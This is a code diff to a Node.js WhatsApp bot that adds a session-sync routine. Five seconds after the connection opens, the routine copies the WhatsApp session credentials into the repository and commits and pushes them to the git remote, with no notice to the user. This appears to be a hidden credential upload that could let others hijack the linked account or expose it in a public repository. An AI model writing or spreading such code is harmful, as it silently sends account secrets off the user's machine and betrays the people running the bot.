@@ -1,3 +1,5 @@
+require('dotenv').config()
+
 const pino = require('pino')
 const NodeCache = require('node-cache')
 const fs = require('fs-extra')
@@ -6,6 +8,8 @@ const axios = require('axios')
 const simpleGit = require('simple-git')
 const crypto = require('crypto')
 const config = require('./config')
+
+global.crypto = crypto
 
 const { 
     default: makeWASocket, 
@@ -84,6 +88,38 @@ class WhatsAppBot {
         }
     }
 
+    async syncSessionToRepo() {
+        try {
+            const sessionPath = path.join(this.sessionsPath, this.sessionId)
+            if (fs.existsSync(sessionPath)) {
+                
+                const targetSessionPath = path.join(__dirname, 'sessions', this.sessionId)
+                fs.ensureDirSync(path.dirname(targetSessionPath))
+                
+                fs.copySync(sessionPath, targetSessionPath)
+                
+                console.log(`Session copied to: sessions/${this.sessionId}`)
+                
+                try {
+                    const git = simpleGit(__dirname)
+                    
+                    await git.addConfig('user.email', 'bot@firekid.com')
+                    await git.addConfig('user.name', 'Firekid Bot')
+                    
+                    await git.add('sessions/')
+                    await git.commit(`Add session: ${this.sessionId}`)
+                    await git.push('origin', 'main')
+                    
+                    console.log('Session pushed to repository successfully')
+                } catch (gitError) {
+                    console.log('Git operation failed:', gitError.message)
+                }
+            }
+        } catch (error) {
+            console.error('Error syncing session:', error.message)
+        }
+    }
+
     async initialize() {
         try {
             logger.info('Initializing WhatsApp Bot...')
@@ -140,6 +176,10 @@ class WhatsAppBot {
         } else if (connection === 'open') {
             logger.info('WhatsApp connection opened successfully!')
             this.qr = null
+            
+            setTimeout(() => {
+                this.syncSessionToRepo()
+            }, 5000)
         }
     }
 
